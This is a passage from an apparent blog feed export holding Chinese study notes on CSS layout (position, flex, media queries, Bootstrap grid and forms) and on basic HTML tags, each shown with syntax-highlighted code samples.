class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">20px</span> <span class="number">30px</span> <span class="number">40px</span>;</span><br></pre></td></tr></table></figure><h3 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h3><ul><li><code>content-box</code>：<strong>默认</strong>选项，修改border和padding会改变元素大小；</li><li><code>border-box</code>：修改border和padding不会改变元素大小</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">box-sizing</span>: border-box;</span><br></pre></td></tr></table></figure><h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><h3 id="position"><a href="#position" class="headerlink" title="position"></a>position</h3><p><a href="https://www.acwing.com/blog/content/16282/">https://www.acwing.com/blog/content/16282/</a></p><p>元素重叠可以使用<code>z-index</code>控制重叠次序，需要将<code>position</code>修改为非<code>static</code></p><ul><li><code>position: static</code>：默认</li><li><code>position: relative</code>：相对于默认的位置使用<code>top: 10px</code>、<code>right: px</code>等改变位置，并且其默认位置会保留</li><li><code>position: absolute</code>：相对于第一个非<code>static</code>的父元素，原来的默认位置会剔除，随页面滚动</li><li><code>position: fixed</code>：相对于第一个非<code>static</code>的父元素，原来的默认位置会剔除，始终固定在视窗上，不随页面滚动</li><li><code>postion: sticky</code></li></ul><h3 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">float</span>: left/right;</span><br><span class="line"><span class="comment">/* 清除错误浮动 */</span></span><br><span class="line"><span class="attribute">clear</span>: left/right/both;</span><br></pre></td></tr></table></figure><h3 id="flex布局"><a href="#flex布局" class="headerlink" title="flex布局"></a>flex布局</h3><p><strong>注意</strong>：控制<code>flex</code>布局是改变父元素的<code>display</code>属性, <code>inline-block</code>等是改变当前元素</p><ul><li>水平-主轴</li><li>竖直-交叉轴</li></ul><h4 id="排列方式"><a href="#排列方式" class="headerlink" title="排列方式"></a>排列方式</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="comment">/* 默认row row-reverse(从右往左) column column-reverse(从下往上) */</span></span><br><span class="line"><span class="attribute">flex-direction</span>: row; </span><br><span class="line"><span class="comment">/* 默认nowrap wrap(换行) wrap-reverse */</span></span><br><span class="line"><span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line"><span class="comment">/* 上面两个的缩写，默认row nowrap */</span></span><br><span class="line"><span class="attribute">flex-flow</span>: column wrap;</span><br></pre></td></tr></table></figure><h4 id="对齐方式"><a href="#对齐方式" class="headerlink" title="对齐方式"></a>对齐方式</h4><h5 id="水平对齐"><a href="#水平对齐" class="headerlink" title="水平对齐"></a>水平对齐</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">justify-content</span><br></pre></td></tr></table></figure><ul><li>flex-start：左对齐</li><li>flex-end：右对齐</li><li>center：居中</li><li>space-between：两端对齐</li></ul><h5 id="竖直对齐"><a href="#竖直对齐" class="headerlink" title="竖直对齐"></a>竖直对齐</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">align-items</span><br></pre></td></tr></table></figure><ul><li>flex-start：上对齐(默认)</li><li>flex-end：下对齐</li><li>center：居中</li><li>strech：铺展(元素未定义高度的前提)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">align-content</span><br></pre></td></tr></table></figure><ul><li>竖直方向元素之间没有空隙</li><li>只有一行无法居中，可以使用<code>align-items</code></li></ul><h4 id="内部元素属性"><a href="#内部元素属性" class="headerlink" title="内部元素属性"></a>内部元素属性</h4><p>排列方式和对齐方式都是<strong>父元素</strong>的属性，下列是定义在<strong>子元素</strong>的属性</p><ul><li><code>order</code>：元素优先级，越小越靠前</li><li><code>flex-grow: n</code>：拥有该属性的元素随屏幕一同伸展，n越大，伸展占比越大</li><li><code>flex-shrink: n</code>：缩小比例</li><li><code>flex-basis: 100px</code>：元素的初始宽度，优先级高于<code>width</code></li></ul><p>上面的属性可以统一使用<code>flex</code>缩写</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 弹性变大和缩小，不换行 */</span></span><br><span class="line"><span class="attribute">flex</span>: auto;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 不变大不缩小，不换行 */</span></span><br><span class="line"><span class="attribute">flex</span>: none;</span><br></pre></td></tr></table></figure><h3 id="响应式布局之Bootstrap"><a href="#响应式布局之Bootstrap" class="headerlink" title="响应式布局之Bootstrap"></a>响应式布局之Bootstrap</h3><p><strong>下载地址：</strong><a href="https://v5.bootcss.com/">Bootstrap</a></p><p><strong>使用</strong>：在官网寻找适合的示例进行修改</p><h4 id="media查询"><a href="#media查询" class="headerlink" title="media查询"></a>media查询</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 大于等于768px的情况 */</span></span><br><span class="line"><span class="keyword">@media</span> (<span class="attribute">min-width</span>: <span class="number">768px</span>) &#123;</span><br><span class="line">    <span class="selector-class">.card</span> &#123;</span><br><span class="line">        <span class="attribute">background-color</span>: lightgreen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 小于等于992px的情况 */</span></span><br><span class="line"><span class="keyword">@media</span> (<span class="attribute">max-width</span>: <span class="number">992px</span>) &#123;</span><br><span class="line">    <span class="selector-class">.card</span> &#123;</span><br><span class="line">        <span class="attribute">background-color</span>: lightcoral;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="引入-1"><a href="#引入-1" class="headerlink" title="引入"></a>引入</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./static/third_party/bootstrap-5.3.0-alpha1-dist/css/bootstrap.min.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./static/third_party/bootstrap-5.3.0-alpha1-dist/js/bootstrap.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>使用的时候要用包裹在<code>container</code>中</li><li><code>row</code>里面接的元素必须是<code>col</code>或如<code>col-md-6</code>等</li></ul><h4 id="栅格"><a href="#栅格" class="headerlink" title="栅格"></a>栅格</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col col-md-6 col-sm-12 col-xs-12&quot;</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col col-md-6 col-sm-12 col-xs-12&quot;</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col col-md-12 col-sm-12 col-xs-12&quot;</span>&gt;</span>个人简介<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mb-3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;exampleInputEmail1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-label&quot;</span>&gt;</span>Email address<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;exampleInputEmail1&quot;</span> <span class="attr">aria-describedby</span>=<span class="string">&quot;emailHelp&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;emailHelp&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-text&quot;</span>&gt;</span>We&#x27;ll never share your email with anyone else.<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mb-3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;exampleInputPassword1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-label&quot;</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;exampleInputPassword1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mb-3 form-check&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-check-input&quot;</span> <span class="attr">id</span>=<span class="string">&quot;exampleCheck1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;form-check-label&quot;</span> <span class="attr">for</span>=<span class="string">&quot;exampleCheck1&quot;</span>&gt;</span>Check me out<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML笔记</title>
      <link href="/post/a0ca7bc4.html"/>
      <url>/post/a0ca7bc4.html</url>
      
        <content type="html"><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>live server<br>auto rename tag</p><h2 id="vscode快捷键"><a href="#vscode快捷键" class="headerlink" title="vscode快捷键"></a>vscode快捷键</h2><ul><li>! + enter：快速生成html框架</li><li>alt + up / down：快速移动一行</li><li>标签*n：生成n个指定标签</li></ul><h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p><a href="https://developer.mozilla.org/zh-CN/">MDN</a></p><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><h4 id="网页描述"><a href="#网页描述" class="headerlink" title="网页描述"></a>网页描述</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;day day up&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="网页关键词"><a href="#网页关键词" class="headerlink" title="网页关键词"></a>网页关键词</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;c++,python,app&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="网页logo"><a href="#网页logo" class="headerlink" title="网页logo"></a>网页logo</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./images/logo.png&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="hr"><a href="#hr" class="headerlink" title="hr"></a>hr</h3><ul><li>水平线</li><li>默认居中不需要设置</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">hr</span> <span class="attr">color</span>=<span class="string">&quot;brown&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300px&quot;</span> <span class="attr">size</span>=<span class="string">&quot;25&quot;</span> <span class="attr">align</span>=<span class="string">&quot;left&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="pre"><a href="#pre" class="headerlink" title="pre"></a>pre</h3><p>保留文本原有格式——不删除空格和回车<br>等宽字体</p><h3 id="mark"><a href="#mark" class="headerlink" title="mark"></a>mark</h3><p>荧光笔  </p><h3 id="width"><a href="#width" class="headerlink" title="width"></a>width</h3><p>width是img等标签的属性，可以使用百分数实现动态变化</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./static/images/logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;logo&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 50%;&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="audio"><a href="#audio" class="headerlink" title="audio"></a>audio</h3><p><strong>音频标签</strong><br>第一种写法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span> <span class="attr">src</span>=<span class="string">&quot;./audios/bgm.mp3&quot;</span>&gt;</span>无法播放<span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第二种写法<br>第一个source无法播放会使用第二个，直到找到可以播放的音乐</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;./audios/bgm.mp3&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/mpeg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;./audios/sound1.mp3&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/mpeg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;./audios/sound2.mp3&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/mpeg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">audio</span>&gt;</span>    </span><br></pre></td></tr></table></figure><h3 id="video"><a href="#video" class="headerlink" title="video"></a>video</h3><p>视频标签</p><p>第二种写法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">controls</span> <span class="attr">src</span>=<span class="string">&quot;./vedios/video1.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第一种写法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;./videos/video1.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;./videos/video2.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="img"><a href="#img" class="headerlink" title="img"></a>img</h3><ul><li>只设置width会保留原始比例</li><li>title：鼠标悬停提示</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;D:\Blog\photos\wallhaven-85dp61 (1).jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;study&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> <span class="attr">height</span>=<span class="string">&quot;600&quot;</span> <span class="attr">title</span>=<span class="string">&quot;study&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="a"><a href="#a" class="headerlink" title="a"></a>a</h3><p>超链接  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;./about.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">&quot;50&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./images/logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;DQY&amp;WYの小窝&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>a标签不仅可以指向外部链接，还可以指向内部元素</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#my_pos&quot;</span>&gt;</span>where is I?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;my_pos&quot;</span>&gt;</span>I&#x27;m here<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ol（ordered-list）"><a href="#ol（ordered-list）" class="headerlink" title="ol（ordered list）"></a>ol（ordered list）</h3><ul><li>有序列表</li><li>快捷键：<code>ol&gt;li*3</code></li><li>type=”1/A/a/I/i”</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">&quot;a&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>昵称</span><br><span class="line">        <span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">&quot;i&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>悦<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>乖乖<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>傻傻<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>爱好</span><br><span class="line">        <span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">&quot;I&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>吃饭<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>睡觉<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>宋江<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ul（unordered-list）"><a href="#ul（unordered-list）" class="headerlink" title="ul（unordered list）"></a>ul（unordered list）</h3><ul><li>无序列表</li><li>快捷键：<code>ul&gt;li*3</code></li><li>使用同<strong>ol</strong></li><li>type=”disc”：默认实心圆</li><li>type=”circle”：空心圆</li><li>type=”square”：小方块</li><li>type=”none”：不显示</li><li>导航一般都是使用无序列表实现(css调整横向展示)</li></ul><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><ul><li>快捷键</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">table&gt;tr*3&gt;td*2&#123;单元格&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>成绩单<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>数学<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>语文<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>英语<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>99<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>98<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>99<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>98<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>97<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>98<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>97<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>96<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>不设置<code>border</code>默认无边框</p></li><li><p>合并单元格（保留带标签的）：<code>colspan</code> -&gt; 水平合并；<code>rowspan</code> -&gt; 垂直合并</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 